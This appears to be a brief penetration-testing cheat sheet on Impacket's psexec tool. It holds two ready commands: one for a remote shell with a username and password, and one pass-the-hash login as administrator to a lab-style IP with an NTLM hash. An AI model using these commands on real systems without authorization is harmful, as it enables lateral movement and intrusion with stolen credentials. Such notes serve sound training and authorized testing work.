Attacks: #PtH 

[Impacket PsExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) - Python PsExec like functionality example using [RemComSvc](https://github.com/kavika13/RemCom).
```shell-session
$ impacket-psexec <USER>:'<PASSWORD>'@<IP>
```
# Pass the Hash
```shell-session
$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```